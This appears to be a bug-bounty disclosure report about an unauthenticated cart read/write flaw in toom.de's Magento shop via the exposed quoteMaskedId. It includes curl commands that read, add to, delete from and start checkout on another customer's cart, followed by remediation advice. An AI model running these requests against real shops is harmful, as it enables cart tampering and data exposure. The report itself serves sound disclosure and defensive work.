# W-004 — Unauthenticated Cart Read/Write via quoteMaskedId (Toom Baumarkt)

**Program:** Toom Baumarkt GmbH (YesWeHack)  
**Asset:** `toom.de` (Magento Commerce / Enterprise)  
**Severity:** Medium — CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L` = **6.0**  
**CWE:** CWE-862 (Missing Authorization) / CWE-639 (Authorization Bypass Through User-Controlled Key)  
**Testing date:** 2026-05-20

---

## TL;DR

Toom's basket API returns a 32-character token (`quoteMaskedId`) in its response body — embedded inside endpoint URLs used for coupon and employee card operations. That same token is the path parameter for Magento's standard guest-carts REST API, which is designed for anonymous (guest) checkout flows. An attacker who obtains the maskedId can read the victim's full cart contents, add and remove items, read totals and shipping methods, and initiate the checkout flow — all without any session cookie.

---

## Discovery Process

### 1. Mapping the basket API

While exploring the checkout flow, I called `GET /shop/rest/V1/toom/basket` with my session cookie. The response included a `settings.endpoints` object:

```json
{
  "settings": {
    "endpoints": {
      "saveCouponEndpoint": "https://toom.de/shop/rest/V1/toom/basket/[TOKEN]/coupon",
      "saveEmployeeCard":   "https://toom.de/shop/rest/V1/toom/basket/[TOKEN]/employee-card"
    }
  }
}
```

The `[TOKEN]` value — 32 alphanumeric characters — was the `quoteMaskedId`.

### 2. Recognizing the Magento pattern

In Magento's REST API, `quoteMaskedId` is the identifier used by the guest-carts resource (`/rest/V1/guest-carts/{maskedId}/`). Guest-carts endpoints exist to allow anonymous shoppers to interact with a cart before creating an account. The question was whether the API would honor these endpoints for an **authenticated** customer's cart without any session.

### 3. Testing unauthenticated access

I dropped the session cookie and hit `GET /shop/rest/V1/guest-carts/[TOKEN]/items`. The server returned HTTP 200 with the full cart contents — item names, SKUs, quantities, prices. No authentication required.

### 4. Testing write operations

Without any cookie, I posted a new item to the cart and received HTTP 200 with the new line item. Then sent a DELETE for that item — HTTP 200 `true`. Both write operations succeeded using only the `quoteMaskedId` in the URL path.

### 5. Testing checkout initiation

I sent an empty POST to the custom `reserve-order` endpoint. Instead of HTTP 401 or 403, the server returned HTTP 400 with an internal quote ID in the error body:

```json
{
  "message": "Order reservation failed for Quote id [INTERNAL_QUOTE_ID]",
  "parameters": {"message": "Reservation is not possible. Invalid email"}
}
```

The server resolved the maskedId to the internal quote, found the cart, and failed at address validation — not at an authorization check. This showed the checkout flow was accessible.

### 6. Cross-account confirmation

Using Account B's session cookie alongside Account A's maskedId produced the identical checkout error. The server had no mechanism to verify that the session in the Cookie header owned the quote identified by the path parameter.

---

## Vulnerability

The `quoteMaskedId` is the sole identifier for cart operations via the guest-carts resource. Toom does not restrict guest-carts access to carts belonging to guest users — authenticated customers' carts are accessible through the same resource.

**Token exposure surface:** The maskedId is not a secret. It appears in:
- Every `GET /shop/rest/V1/toom/basket` response (embedded in `settings.endpoints` URLs)
- Server access logs for every AJAX request during shopping (it's in the URL path)
- New Relic APM — confirmed by toom's CSP listing `*.newrelic.com` and `*.nr-data.net`

**Token longevity:** The maskedId does not rotate on logout/login. A token captured at any point in the cart's lifetime remains valid.

---

## Steps to Reproduce

> Requires two accounts on toom.de (Account A = attacker, Account B = victim with items in cart).

**Step 1 — Obtain the quoteMaskedId from the basket API**

```bash
curl -s "https://toom.de/shop/rest/V1/toom/basket" \
  -H "Cookie: PHPSESSID=[VICTIM_SESSION]"
# → "saveCouponEndpoint": "https://toom.de/shop/rest/V1/toom/basket/[TOKEN]/coupon"
# The [TOKEN] is the quoteMaskedId
```

**Step 2 — Read cart contents (no Cookie header)**

```bash
curl -s "https://toom.de/shop/rest/V1/guest-carts/[TOKEN]/items"
# → HTTP 200: [{item_id, sku, qty, name, price, quote_id}]
```

**Step 3 — Read cart totals (no Cookie header)**

```bash
curl -s "https://toom.de/shop/rest/V1/guest-carts/[TOKEN]/totals"
# → HTTP 200: {grand_total: 599.95, subtotal: ..., items_qty: 5, base_currency_code: "EUR"}
```

**Step 4 — Add item to cart (no Cookie header)**

```bash
curl -s -X POST "https://toom.de/shop/rest/V1/guest-carts/[TOKEN]/items" \
  -H "Content-Type: application/json" \
  -d '{"cartItem":{"sku":"[ANY_SKU]","qty":1,"quote_id":"[TOKEN]"}}'
# → HTTP 200: item added
```

**Step 5 — Delete item (no Cookie header)**

```bash
curl -s -X DELETE "https://toom.de/shop/rest/V1/guest-carts/[TOKEN]/items/[ITEM_ID]"
# → HTTP 200: true
```

**Step 6 — Initiate checkout (no Cookie header)**

```bash
curl -s -X POST "https://toom.de/shop/rest/V1/toom/checkout/[TOKEN]/reserve-order" \
  -H "Content-Type: application/json" -d '{}'
# → HTTP 400 (not 401/403): "Order reservation failed for Quote id [INTERNAL_ID]"
# Server resolves the cart, fails at address validation — not at authorization
```

---

## Impact

**Cart tampering:** An attacker with the maskedId can silently add expensive items or remove existing ones before the victim checks out. If the victim doesn't review the cart at payment time, they pay for items they didn't select.

**Data exposure:** Cart contents, total value, discount state, and shipping preferences are readable to anyone with the maskedId.

**Log exposure:** Because the maskedId appears as a path parameter in every AJAX request during shopping, it ends up in server access logs and in New Relic (confirmed by CSP). This broadens the set of potential observers beyond just the application team.

**CVSS rationale:**
- `AC:H`: Requires obtaining the maskedId, which needs one of the exposure surfaces above.
- `C:L`: Cart contents, totals, shipping methods — sensitive but not identity/payment data.
- `I:L`: Can modify cart (add/remove items).
- `A:L`: Can break the cart state (force rebuild by deleting all items).

---

## Remediation

1. **Disable guest-carts access for authenticated customer quotes.** Authenticated users should interact with their cart only via session-protected `/rest/V1/carts/mine/` endpoints. A Magento plugin on `GuestCartRepository` can check whether the quote belongs to a customer ID and reject if so.

2. **Add ownership verification to custom endpoints.** The `reserve-order` and `creditcard/place-order` endpoints should verify that the authenticated session owns the quote identified by the `quoteMaskedId`. If the session is absent or belongs to a different customer: HTTP 403.

3. **Stop embedding the maskedId in API responses.** Use session-relative paths like `/rest/V1/toom/basket/mine/coupon` instead of token-bearing URLs to prevent the maskedId from reaching the browser and downstream logs.

4. **Rotate the maskedId on session creation.** Limits exposure windows for tokens already captured.

---

## Lessons Learned

- **Magento's guest-carts API is a standard attack surface.** Any Magento Commerce site that mixes authenticated and guest cart logic should explicitly verify that guest-carts endpoints can't access customer quotes.
- **"Token in URL path = token in logs."** Anything embedded in a URL path is never really secret — access logs, APM tools, browser history, CDN logs all capture it.
- **The HTTP 400 vs 401/403 distinction is meaningful.** When an error response reveals internal state (quote ID, email validation failure), it proves the authorization check was never reached. That's the PoC — not the 200.
- **Cross-account confirmation is the PoC.** Using Account A's cookie alongside Account B's maskedId and getting identical behavior proves the server doesn't bind session to quote ownership.
